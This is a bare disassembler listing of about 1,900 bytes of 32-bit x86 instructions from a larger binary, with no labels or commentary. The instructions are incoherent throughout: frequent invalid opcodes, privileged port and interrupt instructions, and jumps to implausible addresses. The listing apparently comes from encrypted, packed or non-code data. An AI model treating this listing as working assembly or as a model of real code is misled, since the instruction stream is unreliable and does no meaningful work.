  41f653:	cmp    DWORD PTR [esi],0x5368680
  41f659:	retf   
  41f65a:	out    0x90,eax
  41f65c:	mov    WORD PTR [ecx+0x76],fs
  41f65f:	mov    dl,0xe7
  41f661:	mov    cl,0xf0
  41f663:	icebp  
  41f664:	cli    
  41f665:	xchg   ebp,eax
  41f666:	lea    esp,[edi+0x22]
  41f669:	mov    ah,0x5c
  41f66b:	mov    eax,0xc31da749
  41f670:	outs   dx,BYTE PTR ds:[esi]
  41f671:	and    ecx,esp
  41f673:	inc    edi
  41f674:	popa   
  41f675:	popf   
  41f676:	jecxz  0x41f6b2
  41f678:	pop    es
  41f679:	mov    bh,BYTE PTR [ecx]
  41f67b:	outs   dx,BYTE PTR ds:[esi]
  41f67c:	stos   DWORD PTR es:[edi],eax
  41f67d:	fs out 0xfe,al
  41f680:	mov    edx,0x156a2b61
  41f685:	sub    bl,al
  41f687:	sti    
  41f688:	xor    BYTE PTR [ebx+edx*4-0x36],0xe
  41f68d:	add    DWORD PTR [esi+0x69],ebx
  41f690:	popf   
  41f691:	mov    dl,0x67
  41f693:	xor    ebp,ebp
  41f695:	add    eax,esi
  41f697:	sbb    BYTE PTR [edx-0x2f4ebf59],al
  41f69d:	fsubr  st(0),st
  41f69f:	(bad)  
  41f6a0:	or     eax,DWORD PTR [edx]
  41f6a2:	jb     0x41f6fb
  41f6a4:	mov    edx,0xc7815a59
  41f6a9:	mov    WORD PTR [ebx-0x7822d17b],ss
  41f6af:	adc    al,BYTE PTR [eax]
  41f6b1:	jecxz  0x41f697
  41f6b3:	mov    ds:0xe2eeb339,eax
  41f6b8:	fprem1 
  41f6ba:	mov    al,ds:0xf03b5486
  41f6bf:	push   edi
  41f6c0:	add    DWORD PTR [esi+0x592fde13],0xba8b786e
  41f6ca:	in     eax,dx
  41f6cb:	call   0xd7f0cf2c
  41f6d0:	scas   eax,DWORD PTR es:[edi]
  41f6d1:	and    BYTE PTR [edx-0x7f],bl
  41f6d4:	ins    DWORD PTR es:[edi],dx
  41f6d5:	out    dx,eax
  41f6d6:	push   cs
  41f6d7:	ret    0xc02c
  41f6da:	push   ebx
  41f6db:	pusha  
  41f6dc:	adc    edx,eax
  41f6de:	mov    esp,0xe0b756a5
  41f6e3:	test   al,0x5c
  41f6e5:	test   eax,0xe3a3de60
  41f6ea:	jmp    0x1b2b19b6
  41f6ef:	repnz mov dh,0x2b
  41f6f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6f3:	or     al,0x8a
  41f6f5:	sar    BYTE PTR [edi+0x6b9ec1e],cl
  41f6fb:	mov    ebp,0xaa003de1
  41f700:	popa   
  41f701:	mov    ecx,0xf8762e8d
  41f706:	ror    DWORD PTR [esi-0x5c],0x7
  41f70a:	ja     0x41f6bf
  41f70c:	mov    bh,0xec
  41f70e:	pusha  
  41f70f:	fwait
  41f710:	bound  esp,QWORD PTR [ebp-0x77]
  41f713:	add    dl,BYTE PTR [ecx]
  41f715:	xor    al,0xb3
  41f717:	mov    ah,BYTE PTR cs:[ebp+0x4b]
  41f71b:	dec    ecx
  41f71c:	jge    0x41f70c
  41f71e:	jge    0x41f6cf
  41f720:	sub    BYTE PTR [edx*2-0x5212bd7d],cl
  41f727:	in     eax,dx
  41f728:	test   DWORD PTR [ebx+0x79],eax
  41f72b:	(bad)  
  41f72c:	dec    eax
  41f72d:	je     0x41f6d3
  41f72f:	cmp    bl,BYTE PTR ds:0x3c462f4f
  41f735:	arpl   WORD PTR [ecx+ecx*1+0x6],di
  41f739:	icebp  
  41f73a:	jnp    0x41f709
  41f73c:	pop    esp
  41f73d:	(bad)  
  41f73e:	sub    eax,0xdefc90d2
  41f743:	(bad)  
  41f745:	das    
  41f746:	sub    ecx,DWORD PTR [ecx+ebx*8-0x86ca1d]
  41f74d:	cmp    al,0xcd
  41f74f:	pop    ss
  41f750:	test   esp,edi
  41f752:	adc    eax,0xa7907af1
  41f757:	xor    BYTE PTR [ecx],ah
  41f759:	inc    esi
  41f75a:	ins    BYTE PTR es:[edi],dx
  41f75b:	mov    dh,0x9b
  41f75d:	mov    ebp,DWORD PTR [eax-0x39ceba0d]
  41f763:	adc    al,0x3c
  41f765:	push   edx
  41f766:	or     BYTE PTR [edi+0x27],dh
  41f769:	dec    eax
  41f76a:	and    ah,0xbc
  41f76d:	xchg   DWORD PTR [eax-0x15],eax
  41f770:	add    esp,edi
  41f772:	ins    DWORD PTR es:[edi],dx
  41f773:	jno    0x41f733
  41f775:	add    cl,BYTE PTR [esi]
  41f777:	sub    bh,BYTE PTR [edx]
  41f779:	data16 or al,BYTE PTR ds:0xe98d5ec3
  41f780:	add    al,0xfc
  41f782:	xchg   esi,eax
  41f783:	scas   eax,DWORD PTR es:[edi]
  41f784:	pop    es
  41f785:	outs   dx,DWORD PTR ds:[esi]
  41f786:	xor    al,0x93
  41f788:	mov    bl,BYTE PTR [esi+0x2a]
  41f78b:	lock mov edx,0x8bb13066
  41f791:	bound  ebx,QWORD PTR [ecx]
  41f793:	jl     0x41f7e3
  41f795:	bound  edx,QWORD PTR [edi+0x3cf5cfcf]
  41f79b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f79c:	or     esi,DWORD PTR [esi-0x5b28c953]
  41f7a2:	not    BYTE PTR [ebp+0x43]
  41f7a5:	sbb    BYTE PTR gs:[eax+eiz*1+0x401900ab],cl
  41f7ad:	sub    eax,0x13033bbe
  41f7b2:	jmp    0x41f825
  41f7b4:	jmp    0xb5561955
  41f7b9:	mov    bh,0x16
  41f7bb:	or     BYTE PTR ds:0x1b276a0a,dh
  41f7c1:	adc    ecx,DWORD PTR [eax-0x72427d98]
  41f7c7:	imul   ebx,DWORD PTR [bp+di+0x6907],0x98dbb059
  41f7d0:	add    BYTE PTR [ebx-0x661a1fe],ah
  41f7d6:	cmp    bh,BYTE PTR [eax]
  41f7d8:	cmp    al,0x8c
  41f7da:	(bad)  
  41f7dc:	mov    ebp,ecx
  41f7de:	fadd   DWORD PTR [ecx]
  41f7e0:	daa    
  41f7e1:	sti    
  41f7e2:	or     bl,ch
  41f7e4:	sub    BYTE PTR [eax+ebp*4-0x77a8c61f],bl
  41f7eb:	ja     0x41f78b
  41f7ed:	ret    
  41f7ee:	jae    0x41f7c6
  41f7f0:	in     al,0x35
  41f7f2:	add    BYTE PTR [edi+0x60],dh
  41f7f5:	xor    al,0x5d
  41f7f7:	jmp    0x41f7ed
  41f7f9:	push   ds
  41f7fa:	aas    
  41f7fb:	push   esi
  41f7fc:	fidivr WORD PTR [ebp-0x2b6dc799]
  41f802:	sti    
  41f803:	loope  0x41f78f
  41f805:	cmp    bh,BYTE PTR [eax+0x1aeb4e74]
  41f80b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f80c:	shr    BYTE PTR [eax],0xc6
  41f80f:	in     al,dx
  41f810:	adc    al,BYTE PTR ds:0xacf53606
  41f816:	out    dx,eax
  41f817:	jns    0x41f7f1
  41f819:	mov    esi,0x22f934b0
  41f81f:	mov    esi,DWORD PTR [ecx-0x7ee1287d]
  41f825:	nop
  41f826:	pop    ecx
  41f827:	sahf   
  41f828:	test   al,0x93
  41f82a:	mov    eax,ds:0xf254bf4c
  41f82f:	test   al,0x9b
  41f831:	cld    
  41f832:	lahf   
  41f833:	in     al,0xa5
  41f835:	loop   0x41f7cf
  41f837:	inc    ecx
  41f838:	outs   dx,DWORD PTR ds:[esi]
  41f839:	pop    ebx
  41f83a:	xor    DWORD PTR [edx-0x6],ebp
  41f83d:	sbb    al,0x84
  41f83f:	push   es
  41f840:	pop    ebp
  41f841:	icebp  
  41f842:	data16 test BYTE PTR [ebp+0x47],0x20
  41f847:	push   edx
  41f848:	cli    
  41f849:	mov    bl,0xc1
  41f84b:	das    
  41f84c:	ja     0x41f817
  41f84e:	call   0x4883fbfc
  41f853:	pop    ebp
  41f854:	in     eax,dx
  41f855:	pop    esp
  41f856:	or     dh,BYTE PTR [eax]
  41f858:	rcl    DWORD PTR [esp+edx*8+0x6c],1
  41f85c:	and    dh,BYTE PTR [ebx-0x422733c2]
  41f862:	sub    al,0x41
  41f864:	div    BYTE PTR [eax+0x2e]
  41f867:	inc    esi
  41f868:	pop    ebp
  41f869:	adc    al,0xa2
  41f86b:	je     0x41f81e
  41f86d:	xchg   edi,eax
  41f86e:	imul   edi,esi,0xa02967e1
  41f874:	in     eax,0xf8
  41f876:	xlat   BYTE PTR ds:[ebx]
  41f877:	fsubr  DWORD PTR [edx-0x4245c11]
  41f87d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f87e:	xchg   eax,esp
  41f880:	(bad)  
  41f882:	gs clc 
  41f884:	in     al,dx
  41f885:	sbb    al,0xf8
  41f887:	dec    edx
  41f888:	out    dx,al
  41f889:	cmc    
  41f88a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f88b:	pop    esp
  41f88c:	(bad)  
  41f88d:	or     DWORD PTR [ecx],eax
  41f88f:	scas   eax,DWORD PTR es:[edi]
  41f890:	(bad)  
  41f891:	je     0xfc0260f3
  41f897:	jo     0x41f8ed
  41f899:	fistp  QWORD PTR [ebx+eax*1-0x10f3a507]
  41f8a0:	pop    ss
  41f8a1:	aaa    
  41f8a2:	fistp  WORD PTR [eax+0x6417dcbb]
  41f8a8:	xor    eax,DWORD PTR [eax-0x13]
  41f8ab:	dec    esp
  41f8ac:	mov    dh,0x18
  41f8ae:	hlt    
  41f8af:	int3   
  41f8b0:	adc    ebp,0xffffffbf
  41f8b3:	(bad)  
  41f8b4:	mov    esp,0x6d115172
  41f8b9:	push   es
  41f8ba:	(bad)  
  41f8bc:	add    al,0x16
  41f8be:	arpl   WORD PTR [ebp-0x7b53e48c],ax
  41f8c4:	pop    ecx
  41f8c5:	mov    ebp,0x9a734ce0
  41f8ca:	add    al,0xe3
  41f8cc:	imul   ecx,DWORD PTR ss:[edi+0x6],0xe35506d5
  41f8d4:	add    BYTE PTR [edi],ch
  41f8d6:	dec    esp
  41f8d7:	ficom  WORD PTR [eax-0x31]
  41f8da:	aas    
  41f8db:	shr    dh,cl
  41f8dd:	xchg   ecx,eax
  41f8de:	fcomip st,st(1)
  41f8e0:	fwait
  41f8e1:	pop    ss
  41f8e2:	adc    BYTE PTR [eax],cl
  41f8e4:	repnz mov esp,DWORD PTR [eax]
  41f8e7:	xor    eax,0x871700ee
  41f8ec:	shl    dh,cl
  41f8ee:	sti    
  41f8ef:	or     esi,DWORD PTR [edx+esi*4+0x3f6ca579]
  41f8f6:	jmp    0x41f887
  41f8f8:	leave  
  41f8f9:	sbb    al,bl
  41f8fb:	test   DWORD PTR [ecx-0x77],ecx
  41f8fe:	sar    WORD PTR [edi+ecx*1],cl
  41f902:	(bad)  
  41f903:	fdiv   QWORD PTR [esi+0x2b]
  41f906:	jbe    0x41f948
  41f908:	ds jnp 0x41f90a
  41f90b:	and    BYTE PTR [ecx],cl
  41f90d:	mov    al,0x19
  41f90f:	mov    eax,0xc7edb123
  41f914:	jne    0x41f8ce
  41f916:	push   ds
  41f917:	sub    BYTE PTR [esi+eax*8],al
  41f91a:	into   
  41f91b:	adc    dh,BYTE PTR [edx+0x1f07e976]
  41f921:	jnp    0x41f917
  41f923:	lock mov bh,0xec
  41f926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f927:	(bad)  
  41f928:	jbe    0x41f93c
  41f92a:	outs   dx,BYTE PTR ds:[esi]
  41f92b:	call   0x42b5:0xd549b4b8
  41f932:	sub    DWORD PTR [esi+0x797372a4],ebx
  41f938:	mov    ebx,0xe2a17382
  41f93d:	sub    esp,DWORD PTR [ebx-0x65]
  41f940:	mov    esp,0xfd3fdba9
  41f945:	and    esp,0x4231ff74
  41f94b:	mov    WORD PTR [ecx],cs
  41f94d:	lahf   
  41f94e:	loopne 0x41f983
  41f950:	xchg   esp,eax
  41f951:	jns    0x41f99d
  41f953:	pushf  
  41f954:	fbld   TBYTE PTR [ebp-0x6edc7ec4]
  41f95a:	push   cs
  41f95b:	or     dh,ah
  41f95d:	add    esp,DWORD PTR [edx-0x112ef23b]
  41f963:	push   ds
  41f964:	aad    0xe
  41f966:	jmp    0xc38184f4
  41f96b:	icebp  
  41f96c:	jmp    0x513d33e2
  41f971:	mov    ds:0x421c5d32,eax
  41f976:	sub    esi,DWORD PTR [esi*4+0x1eadfd0f]
  41f97d:	sub    BYTE PTR [ebp-0x1db417a3],dl
  41f983:	in     al,dx
  41f984:	sbb    BYTE PTR [ebp-0x5c],ah
  41f987:	(bad)  
  41f989:	mov    dh,0x5c
  41f98b:	shl    BYTE PTR [edx+0x3f],0x67
  41f98f:	je     0x41f9e0
  41f991:	lds    edi,FWORD PTR [ecx]
  41f993:	cdq    
  41f994:	test   eax,0x7c393e88
  41f999:	jmp    0x34894e63
  41f99e:	fild   QWORD PTR [ecx+0x4774bd9c]
  41f9a4:	cmp    al,bl
  41f9a6:	stos   BYTE PTR es:[edi],al
  41f9a7:	lea    esi,[ecx+0x40]
  41f9aa:	xlat   BYTE PTR ds:[ebx]
  41f9ab:	arpl   WORD PTR [eax+0x33],bx
  41f9ae:	ret    
  41f9af:	inc    edi
  41f9b0:	ja     0x41f9db
  41f9b2:	mov    gs,edx
  41f9b4:	mov    ebp,0xf9418f15
  41f9b9:	add    BYTE PTR [ebp-0xa],dh
  41f9bc:	rcr    DWORD PTR [ebx],1
  41f9be:	clc    
  41f9bf:	mov    al,0xf1
  41f9c1:	(bad)  
  41f9c2:	in     al,dx
  41f9c3:	(bad)  
  41f9c5:	js     0x41f97b
  41f9c7:	in     eax,0x47
  41f9c9:	xor    eax,0x331cfcd1
  41f9ce:	test   al,0x7c
  41f9d0:	imul   edx,DWORD PTR [ebp-0x5b101686],0x76
  41f9d7:	push   esi
  41f9d8:	mov    edx,0xc7518309
  41f9dd:	jg     0x41f9a0
  41f9df:	(bad)  
  41f9e0:	les    edi,FWORD PTR [eax]
  41f9e2:	lods   eax,DWORD PTR ds:[esi]
  41f9e3:	xchg   ebx,eax
  41f9e4:	pusha  
  41f9e5:	dec    ebx
  41f9e6:	imul   eax,DWORD PTR [edi+0x23],0x6c2718a7
  41f9ed:	fcomp  QWORD PTR [ebp-0x4d879e72]
  41f9f3:	xchg   edi,eax
  41f9f4:	adc    BYTE PTR [esi+0x58],dl
  41f9f7:	dec    edi
  41f9f8:	cmp    edi,0x37
  41f9fb:	fisttp WORD PTR [ebp-0x36]
  41f9fe:	setae  BYTE PTR [ebx-0x24]
  41fa02:	imul   edi,DWORD PTR [ebx+0x42],0x54a08e8e
  41fa09:	fisttp WORD PTR [edi+ebx*8+0x63]
  41fa0d:	das    
  41fa0e:	add    dh,BYTE PTR [ebp+0x21]
  41fa11:	pop    eax
  41fa12:	cmp    ch,BYTE PTR [ebx]
  41fa14:	xor    bl,al
  41fa16:	and    esp,DWORD PTR [esi-0x78d45723]
  41fa1c:	mov    ecx,0xcaa83c37
  41fa21:	push   ss
  41fa22:	aad    0x99
  41fa24:	mov    eax,ds:0x2408326f
  41fa29:	sbb    edx,edi
  41fa2b:	shr    DWORD PTR [esi-0xd256c7a],0x79
  41fa32:	pop    ecx
  41fa33:	shl    BYTE PTR [ebp+0xc3ff010],1
  41fa39:	inc    esp
  41fa3a:	cmp    DWORD PTR [eax+0x65],ebx
  41fa3d:	jmp    0x41f9cd
  41fa3f:	sub    BYTE PTR [edi+0x4e],dh
  41fa42:	or     BYTE PTR [edx],dh
  41fa44:	sar    esp,0x24
  41fa47:	into   
  41fa48:	jbe    0x41f9d9
  41fa4a:	ret    
  41fa4b:	sub    DWORD PTR [ebp+0x5b],edx
  41fa4e:	dec    BYTE PTR [ecx+0x26]
  41fa51:	pop    ecx
  41fa52:	pop    edx
  41fa53:	cli    
  41fa54:	cli    
  41fa55:	add    BYTE PTR cs:[edi+0x1145986d],dh
  41fa5c:	std    
  41fa5d:	push   ds
  41fa5e:	sub    DWORD PTR [ecx-0x77],0xffffffde
  41fa62:	push   esp
  41fa63:	call   0x4f222f53
  41fa68:	sbb    DWORD PTR [ebx-0x98555ae],ebx
  41fa6e:	mov    edx,0x4ac0d301
  41fa73:	cmp    eax,0x59e05603
  41fa78:	sub    esp,eax
  41fa7a:	(bad)  
  41fa7b:	in     eax,dx
  41fa7c:	(bad)  
  41fa7d:	dec    ebx
  41fa7e:	pushf  
  41fa7f:	sub    al,0x3d
  41fa81:	xor    DWORD PTR ss:[esi+0x1ff0104d],esp
  41fa88:	lods   eax,DWORD PTR ds:[esi]
  41fa89:	push   ds
  41fa8a:	adc    bl,bl
  41fa8c:	or     cl,BYTE PTR [edi+ebp*1-0x13f93384]
  41fa93:	repz fimul DWORD PTR [esi-0x1d650b1c]
  41fa9a:	ficom  WORD PTR [ecx+0x23]
  41fa9d:	mov    gs,WORD PTR cs:[edi-0x1]
  41faa1:	daa    
  41faa2:	outs   dx,DWORD PTR ds:[esi]
  41faa3:	inc    esi
  41faa4:	clc    
  41faa5:	push   edi
  41faa6:	mov    esp,0xa8b86439
  41faab:	adc    DWORD PTR [ecx],eax
  41faad:	sub    DWORD PTR [ebp-0x5e69a9d6],esp
  41fab3:	pop    ds
  41fab4:	or     eax,DWORD PTR [edx+0x3a]
  41fab7:	or     edi,ebx
  41fab9:	cmp    eax,DWORD PTR [ecx]
  41fabb:	jg     0x41fa4d
  41fabd:	sti    
  41fabe:	mov    eax,0xe2696038
  41fac3:	in     eax,dx
  41fac4:	mov    edi,0x28f150c7
  41fac9:	jb     0x49b258cc
  41facf:	jge    0x41fb4b
  41fad1:	cmp    al,BYTE PTR [esi-0x921ba59]
  41fad7:	pop    ecx
  41fad8:	outs   dx,WORD PTR ds:[esi]
  41fada:	xchg   ecx,eax
  41fadb:	xor    DWORD PTR [esi+0x4a],edx
  41fade:	inc    ebx
  41fadf:	push   ds
  41fae0:	or     eax,0xd4c62547
  41fae5:	outs   dx,BYTE PTR ds:[esi]
  41fae6:	dec    ecx
  41fae7:	mov    ah,0x30
  41fae9:	cmp    esp,DWORD PTR ds:0x9ac6e53b
  41faef:	rcl    DWORD PTR [esi+0x573c7859],1
  41faf5:	jno    0x41fa9b
  41faf7:	inc    edi
  41faf8:	inc    esp
  41faf9:	and    ebp,DWORD PTR [esi+0x39]
  41fafc:	cmc    
  41fafd:	outs   dx,BYTE PTR ds:[esi]
  41fafe:	pfrsqit1 mm5,mm4
  41fb02:	mov    al,ds:0xe11ce365
  41fb07:	daa    
  41fb08:	fwait
  41fb09:	xlat   BYTE PTR ds:[ebx]
  41fb0a:	or     BYTE PTR [ecx-0x7cd8f0a1],dl
  41fb10:	imul   ecx,DWORD PTR [eax-0x7b1e0a4a],0x14
  41fb17:	inc    eax
  41fb18:	daa    
  41fb19:	fidiv  DWORD PTR [edx+eax*1]
  41fb1c:	inc    esi
  41fb1d:	and    DWORD PTR [ecx-0x39],0x92d858e8
  41fb24:	push   0x7c
  41fb26:	pop    ecx
  41fb27:	and    dl,BYTE PTR ds:0x80ebc85e
  41fb2d:	jbe    0x41facc
  41fb2f:	nop
  41fb30:	cmp    DWORD PTR [eax-0x48],0x392dbe8b
  41fb37:	(bad)  
  41fb38:	fmul   DWORD PTR [ebx-0x6b155e8a]
  41fb3e:	jl     0x41faf1
  41fb40:	push   esi
  41fb41:	iret   
  41fb42:	hlt    
  41fb43:	and    DWORD PTR [esi],edi
  41fb45:	and    eax,0xa510018c
  41fb4a:	jle    0x41faf6
  41fb4c:	xor    ah,BYTE PTR [eax]
  41fb4e:	ret    0x9559
  41fb51:	sub    eax,0x27c90035
  41fb56:	outs   dx,DWORD PTR ds:[esi]
  41fb57:	js     0x41fb70
  41fb59:	fwait
  41fb5a:	mov    cl,0xf8
  41fb5c:	pop    esp
  41fb5d:	loope  0x41fb52
  41fb5f:	mov    DWORD PTR [edx-0x54],ebp
  41fb62:	ror    BYTE PTR [edx+0x45],cl
  41fb65:	add    eax,DWORD PTR [esi*2-0x1b9638f2]
  41fb6c:	dec    eax
  41fb6d:	fadd   st(4),st
  41fb6f:	sti    
  41fb70:	fwait
  41fb71:	inc    ecx
  41fb72:	pushf  
  41fb73:	(bad)  
  41fb74:	mov    dl,0x2d
  41fb76:	xor    bh,BYTE PTR [esi]
  41fb78:	in     eax,0x35
  41fb7a:	loopne 0x41fbcf
  41fb7c:	aas    
  41fb7d:	popf   
  41fb7e:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb80:	sub    eax,0x49f1923b
  41fb85:	les    ebx,FWORD PTR cs:[ebp+0x3]
  41fb89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb8a:	popa   
  41fb8b:	sbb    ch,al
  41fb8d:	jl     0x41fbb1
  41fb8f:	scas   al,BYTE PTR es:[edi]
  41fb90:	mov    ecx,0xa2360654
  41fb95:	and    DWORD PTR [esi],edi
  41fb97:	sbb    BYTE PTR [eax+0x3f94427b],0xc8
  41fb9e:	mov    ebx,0x6e9e4262
  41fba3:	aam    0x8f
  41fba5:	mov    BYTE PTR [eax-0x16fdb3a7],0xc4
  41fbac:	dec    edi
  41fbad:	iret   
  41fbae:	dec    ecx
  41fbaf:	jb     0x41fb95
  41fbb1:	dec    ecx
  41fbb2:	jne    0x41fc0a
  41fbb4:	inc    edx
  41fbb5:	iret   
  41fbb6:	loopne 0x41fb81
  41fbb8:	xor    eax,DWORD PTR [edx+esi*8-0x22d0da48]
  41fbbf:	pushf  
  41fbc0:	jge    0x41fc1c
  41fbc2:	add    al,0x52
  41fbc4:	jp     0x41fc2e
  41fbc6:	jmp    0x41fbaf
  41fbc8:	dec    ebx
  41fbc9:	dec    ebx
  41fbca:	jecxz  0x41fb58
  41fbcc:	xor    al,BYTE PTR ds:0x11c0bd43
  41fbd2:	(bad)  
  41fbd3:	cld    
  41fbd4:	push   edx
  41fbd5:	pop    esi
  41fbd6:	jae    0x41fb62
  41fbd8:	scas   al,BYTE PTR es:[edi]
  41fbd9:	jmp    0xe9a2:0x72dc612b
  41fbe0:	cmp    al,0x47
  41fbe2:	and    BYTE PTR [edx+0x16e2268f],al
  41fbe8:	dec    esp
  41fbe9:	in     eax,0xce
  41fbeb:	in     eax,dx
  41fbec:	arpl   WORD PTR [edi-0x65],bx
  41fbef:	out    dx,eax
  41fbf0:	inc    ebx
  41fbf1:	xchg   edx,eax
  41fbf2:	mov    dh,0x3d
  41fbf4:	fcom   DWORD PTR [ebp+0x2e661330]
  41fbfa:	inc    ecx
  41fbfb:	sub    ch,BYTE PTR [ecx]
  41fbfd:	(bad)  
  41fbfe:	(bad)  
  41fbff:	out    dx,eax
  41fc00:	arpl   WORD PTR [ebp-0x4ee7d3a2],di
  41fc06:	scas   al,BYTE PTR es:[edi]
  41fc07:	popfw  
  41fc09:	pop    ds
  41fc0a:	popa   
  41fc0b:	mov    edi,0x962b98f3
  41fc10:	push   esi
  41fc11:	pushf  
  41fc12:	repz pushf 
  41fc14:	(bad)  
  41fc15:	(bad)  
  41fc16:	imul   eax,edi,0xffffffeb
  41fc19:	ins    BYTE PTR es:[edi],dx
  41fc1a:	pop    ecx
  41fc1b:	out    0x48,al
  41fc1d:	adc    DWORD PTR [ebx-0x4e],ecx
  41fc20:	push   ebx
  41fc21:	or     DWORD PTR cs:[esi],esi
  41fc24:	xor    al,0xee
  41fc26:	xor    ebp,DWORD PTR [edi]
  41fc28:	inc    eax
  41fc29:	add    al,0xaf
  41fc2b:	push   ss
  41fc2c:	dec    esp
  41fc2d:	adc    eax,0x2213c7ba
  41fc32:	fs xor al,0xc8
  41fc35:	cmp    eax,0x197589a8
  41fc3a:	jecxz  0x41fc6a
  41fc3c:	sti    
  41fc3d:	stos   DWORD PTR es:[edi],eax
  41fc3e:	lock sbb bh,BYTE PTR [edx+0x1d]
  41fc42:	mov    ecx,0x45d5d97e
  41fc47:	mov    al,0x1f
  41fc49:	fwait
  41fc4a:	xor    ebx,DWORD PTR [edi-0x50dfa42f]
  41fc50:	lods   eax,DWORD PTR ds:[esi]
  41fc51:	sub    ecx,ebp
  41fc53:	jecxz  0x41fc67
  41fc55:	(bad)  
  41fc56:	cwde   
  41fc57:	les    ebp,FWORD PTR [ebx]
  41fc59:	push   esi
  41fc5a:	jb     0x41fc56
  41fc5c:	push   ebp
  41fc5d:	outs   dx,DWORD PTR ds:[esi]
  41fc5e:	jbe    0x41fbfb
  41fc60:	mov    bl,0xd1
  41fc62:	cmp    cl,BYTE PTR [eax+0x60]
  41fc65:	dec    edx
  41fc66:	out    dx,al
  41fc67:	in     al,dx
  41fc68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc69:	js     0x41fc5e
  41fc6b:	and    dl,al
  41fc6d:	das    
  41fc6e:	loope  0x41fcb3
  41fc70:	cmp    DWORD PTR [edi+0x792366b4],eax
  41fc76:	dec    ecx
  41fc77:	(bad)  
  41fc78:	in     eax,0x60
  41fc7a:	add    BYTE PTR [esi-0x2072d1ec],bh
  41fc80:	ror    BYTE PTR [edi-0x6b],1
  41fc83:	push   edi
  41fc84:	adc    cl,BYTE PTR [ebp-0x727910d2]
  41fc8a:	pop    ds
  41fc8b:	adc    DWORD PTR ds:0x9883fb9d,ebp
  41fc91:	aas    
  41fc92:	mov    ch,0x96
  41fc94:	(bad)  
  41fc95:	out    0xea,al
  41fc97:	ss inc esi
  41fc99:	lods   al,BYTE PTR ds:[esi]
  41fc9a:	jae    0x41fcfd
  41fc9c:	lods   al,BYTE PTR ds:[esi]
  41fc9d:	scas   eax,DWORD PTR es:[edi]
  41fc9e:	aad    0x31
  41fca0:	out    0xf8,al
  41fca2:	iret   
  41fca3:	jg     0x41fca0
  41fca5:	mov    dh,0xfc
  41fca7:	xchg   DWORD PTR [edx-0x754a9b2a],esi
  41fcad:	call   0xf54fe8ca
  41fcb2:	mov    ebp,0x8a54071
  41fcb7:	outs   dx,DWORD PTR ds:[esi]
  41fcb8:	ja     0x41fd1c
  41fcba:	std    
  41fcbb:	push   ss
  41fcbc:	dec    ebp
  41fcbd:	aam    0x7c
  41fcbf:	es lock (bad) 
  41fcc2:	es cwde 
  41fcc4:	push   edx
  41fcc5:	sub    edi,0x1360a08f
  41fccb:	ret    
  41fccc:	mov    dh,0xcb
  41fccf:	add    ebp,DWORD PTR [edi+0x64]
  41fcd2:	hlt    
  41fcd3:	aas    
  41fcd4:	lahf   
  41fcd5:	cmp    eax,0x41f4e1be
  41fcda:	out    0x4b,eax
  41fcdc:	mov    bh,0x35
  41fcde:	dec    esp
  41fcdf:	out    dx,al
  41fce0:	sub    eax,0xe9e888a4
  41fce5:	push   0xffffffe6
  41fce7:	jecxz  0x41fd53
  41fce9:	bound  eax,QWORD PTR [ebx+0x58]
  41fcec:	push   0x67aa4357
  41fcf1:	xchg   ebx,eax
  41fcf2:	inc    edi
  41fcf3:	stc    
  41fcf4:	pop    ds
  41fcf5:	or     DWORD PTR [esi+0x3bfbc69],0x1a09e9db
  41fcff:	enter  0x71fa,0xbe
  41fd03:	add    eax,DWORD PTR [ebx-0x60]
  41fd06:	and    ebp,esp
  41fd08:	jge    0x41fd3e
  41fd0a:	jmp    DWORD PTR [ebx+0x512377b7]
  41fd10:	retf   
  41fd11:	lock icebp 
  41fd13:	ds cli 
  41fd15:	(bad)  
  41fd16:	(bad)  
  41fd17:	dec    esi
  41fd18:	jg     0x41fd11
  41fd1a:	in     eax,0xe0
  41fd1c:	cli    
  41fd1d:	pop    edx
  41fd1e:	out    dx,eax
  41fd1f:	test   BYTE PTR [eax],bl
  41fd21:	inc    ecx
  41fd22:	data16 fld QWORD PTR [ebx+ebx*4]
  41fd26:	dec    ecx
  41fd27:	xchg   esi,eax
  41fd28:	lahf   
  41fd29:	inc    ebp
  41fd2a:	adc    al,0xd9
  41fd2c:	push   eax
  41fd2d:	not    DWORD PTR [edx-0x6aa6edae]
  41fd33:	xchg   edi,edi
  41fd35:	mov    ah,0xed
  41fd37:	mov    esp,0xe840cdfa
  41fd3c:	inc    edi
  41fd3d:	xchg   edi,eax
  41fd3e:	push   esi
  41fd3f:	cld    
  41fd40:	cwde   
  41fd41:	scas   al,BYTE PTR es:[edi]
  41fd42:	sbb    dl,BYTE PTR [esi]
  41fd44:	pop    esp
  41fd45:	add    ah,BYTE PTR [esi+0x53]
  41fd48:	mov    ebx,0x7c551fe3
  41fd4d:	std    
  41fd4e:	stc    
  41fd4f:	mov    esp,0x945766a4
  41fd54:	dec    esp
  41fd55:	push   edx
  41fd56:	mov    ebp,0x9ae59136
  41fd5b:	(bad)  
  41fd5c:	(bad)  
  41fd5e:	cmp    BYTE PTR [edx-0x4c],dh
  41fd61:	cmp    ecx,esp
  41fd63:	jmp    0x41fd9a
  41fd65:	es mov ch,0x2e
  41fd68:	retf   
  41fd69:	mov    ebx,0xec51b994
  41fd6e:	jg     0x41fd98
  41fd70:	jnp    0x41fd01
  41fd72:	std    
  41fd73:	mov    cl,0x1e
  41fd75:	icebp  
  41fd76:	mov    edx,0xf7b6da89
  41fd7b:	add    BYTE PTR [ebp-0x78],dl
  41fd7e:	imul   ebx,DWORD PTR [esi+ecx*8+0x1f442be1],0x1319f18b
  41fd89:	mov    bh,0x65
  41fd8b:	pop    ecx
  41fd8c:	adc    eax,0xfffffff3
  41fd8f:	or     al,0x30
  41fd91:	pop    es
  41fd92:	add    DWORD PTR [eax+0x35],esi
  41fd95:	fs or  dl,bl
  41fd98:	jbe    0x41fdb1
  41fd9a:	mov    ds:0x61512aa6,eax
  41fd9f:	push   0xffffffac
  41fda1:	(bad)  
  41fda2:	adc    eax,0x41d44576
  41fda7:	mov    ah,0x34
  41fda9:	xchg   esp,eax
  41fdaa:	xchg   esp,eax
  41fdab:	xor    al,0xdf
